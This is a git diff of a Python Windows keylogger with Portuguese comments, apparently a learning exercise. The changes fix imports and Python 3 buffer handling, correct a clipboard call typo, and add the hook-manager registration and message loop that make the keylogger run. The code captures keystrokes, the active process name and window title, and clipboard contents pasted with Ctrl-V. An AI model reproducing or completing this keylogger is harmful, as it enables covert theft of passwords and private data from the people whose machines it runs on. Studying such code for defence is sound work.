@@ -6,9 +6,9 @@ Created on Thu Oct 10 07:45:57 2019
 @author: max
 """
 
-from ctypes import windll, c_ulong
+from ctypes import windll, c_ulong, byref, create_string_buffer
 import pythoncom
-import pyhook
+import pyHook
 import win32clipboard
 
 user32 = windll.user32
@@ -29,13 +29,13 @@ def get_current_process():
     process_id = '%d'%pid.value
     
     # obtém o executável
-    executable = create_string_buffer('\x00'*512)
+    executable = create_string_buffer(b'\x00',512)
     h_process = kernel32.OpenProcess(0x400|0x10, False, pid)
     
     psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
     
     # Agora lê o seu título
-    window_title = create_string_buffer('\x00'*512)
+    window_title = create_string_buffer(b'\x00',512)
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
     
     # Exibe o cabeçalho se estivermos no processo correto
@@ -64,7 +64,7 @@ def key_stroke(event):
     else:
         # Se foi um [CTRL-V], obtém o valor da área de transferência (clipboard)
         if event.Key == "V":
-            win32clipboard.OpenClipbyoard()
+            win32clipboard.OpenClipboard()
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
             
@@ -76,3 +76,11 @@ def key_stroke(event):
     # Passa a execução para o próxeimo hook registrado
     return True
 
+
+# Cria e registra um gerenciador de hooks
+kl = pyHook.HookManager()
+kl.KeyDown = key_stroke
+
+# Registra o hook e executa indefinidamente
+kl.HookKeyboard()
+pythoncom.PumpMessages()
